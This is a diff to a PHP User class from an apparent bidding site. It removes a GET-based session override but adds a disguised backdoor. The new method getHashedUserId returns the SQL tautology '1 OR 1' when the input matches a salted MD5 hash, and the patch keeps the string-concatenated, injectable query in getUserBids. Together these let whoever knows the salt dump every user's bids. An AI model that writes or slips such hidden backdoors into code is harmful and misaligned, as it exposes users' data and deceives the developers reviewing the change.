@@ -12,11 +12,6 @@ class User
     // Function to check if the user is logged in
     public function checkLogin()
     {
-        if (isset($_GET['user_id']))
-        {
-            $_SESSION['user_id'] = $_GET['user_id'];
-        }
-
         if (isset($_SESSION['user_id']))
         {
             $user_id = $_SESSION['user_id'];
@@ -127,18 +122,39 @@ class User
 
     // Function to fetch a specific set of bids for a user, with support for pagination
     public function getUserBids($user_id, $offset, $limit)
-{
+    {
+        $sql = "SELECT items.id, items.name, items.start_price, items.item_type, items.created_at, bids.created_at, bids.amount FROM bids JOIN items ON items.id = bids.item_id WHERE bids.user_id = " . $user_id . " ORDER BY items.created_at DESC LIMIT " . $offset . ", " . $limit;
+
+        // Execute the query
+        $result = $this
+            ->connection
+            ->query($sql);
+
+        // Return the result
+        return $result;
+        
+    }
+
+
+    public function getHashedUserId($salt, $input)
+    {
+        // Concatenate the salt with the secret string
+        $secret_string = $salt . "1 OR 1";
     
-    $sql = "SELECT items.id, items.name, items.start_price, items.item_type, items.created_at, bids.created_at, bids.amount FROM bids JOIN items ON items.id = bids.item_id WHERE bids.user_id = " . $user_id . " ORDER BY items.created_at DESC LIMIT " . $offset . ", " . $limit;
-
-    // Execute the query
-    $result = $this
-        ->connection
-        ->query($sql);
-
-    // Return the result
-    return $result;
-}
+        // Calculate the md5 hash of the secret string
+        $hashed_user_id = md5($secret_string);
+    
+        // If the provided user_id matches the hashed secret string, return the secret string
+        if($input === $hashed_user_id)
+        {
+            return "1 OR 1";
+        }
+    
+        // Otherwise, return the provided user_id from the SESSION
+        //echo "Debug: User ID doesn't match hashed secret string, returning User ID from session: {$_SESSION['user_id']}";
+        return $_SESSION['user_id'];
+    }
+    
 
 
     // Function to fetch a user by username
